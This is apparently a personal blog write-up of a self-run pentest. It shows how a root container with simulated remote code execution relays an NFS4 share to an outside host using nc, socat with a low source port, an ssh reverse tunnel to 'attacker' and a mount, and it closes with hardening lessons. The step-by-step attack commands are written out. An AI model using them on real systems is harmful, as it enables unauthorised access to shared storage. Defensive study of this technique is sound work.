---
title: "Relaying NFS4 from inside a container"
date: 2026-01-07
tags:
- containers
- pentest
- network
featuredImage: /images/rohan-ZoXCoH7tja0-unsplash.jpg
---

## Introduction
I recently set-up a **docker swarm** and was so excited!

The first thing I learnt was that to operate a swarm you needed a sort of
network storage or a highly available storage.

NFS4 was the winner for me and a NFS VM was created and shares were made for
hosting docker volumes, what could go wrong?!

Well, at first everything seemed fine, but as some of you may know, setting up
auth on NFS is a bit painful, at least for me it is. By default there is no
authentication and access control is demanded to IP whitelisting. Okay cool.

With the subnet of the swarm being locked no one outside of it could access the
shares.. yeah.. 

**I also enabled the `secure` option on NFS**, that demands the source port of the
TCP connection to be lower than 1024, so it needs to be originated from the root
user, which is kind of smart, I wouldn't never have thought about this.

After deploying some containers and playing a bit with everything for a few days
to find the perfect setup I was hit with a existential doubt:
**What if a container's security gets compromised?**

Of course the container can access his own data, but
**what if the container is able to access the whole NFS share**?

Naahhh I must be missing something.. but let's test it anyway..

## Attack simulation
I simulate an RCE on a container that gets run as root (a lot of them are)
and download netcat.

I launch it to connect directly to the NFS share with a low port.. and guess what?

**It works**.

`nc -v -p 532 nfs-share-ip 2049`

![scared cat](/images/scared_cat.webp)

Okay now what?

I mean **it should not be possible to mount the shares locally**, and in fact it's
not.

To do that, there is the need of a privileged container.. ***but*** the TCP connection
is open with the lower port and I cannot sleep at night by knowing that **the
connection can be relayed somewhere** to be then mounted on a VM that has the
`nfs` kernel module etc.

## Actual exploitation
After a bit of research I decide to use `socat` to listen to port 2049 **inside**
the container while mapping it to the remote `2049` port of the NFS share, by
specifying a source port that it's lower than 1024:

`socat TCP-LISTEN:2049,fork,reuseaddr TCP:NFSSERVER:2049,sourceport=532`

I now download `ssh` and launch: `ssh user@attacker -R 2049:127.0.0.1:2049`,
with this command the **local port 2049 of the container gets mapped on the
remote host** I am connecting to: `attacker`.

From the `attacker` host I then `sudo su` and issue
`mount -t nfs4 127.0.0.1:/stuff /mnt` and...

**It works**

![crying dog](/images/crying_dog.gif)

I successfully mounted a share that I shouldn't have access to, on a host that
is not on the subnet.

This is what I see from the NFS host:

`tcp        0      0 x.x.x.x:2049     y.y.y.y:532      ESTABLISHED`

## Diagram of what happens

![diagram](/images/nfs_relaying_diagram.png)

## Lessons learned

1. **Running containers as root**, even if unprivileged, **may be dangerous**.
2. If you have to run software as root inside the container, at least
    **make them use a "internal" connection** on docker, so they contact outside
    IP addresses.
3. If you can't limit to user root and internal connection, absolutely
    **deny it the possibility to contact the TCP port of the NFS share**.


## Conclusion

Before relaying the connection with `socat` I tried all `nmap` scripts, but
found out that they work only for NFS 3 and lower, as they make use of the
`rpcbind` service. I found no tool/guide to gather information regarding NFS 4
shares, so I decided to write this mini guide.
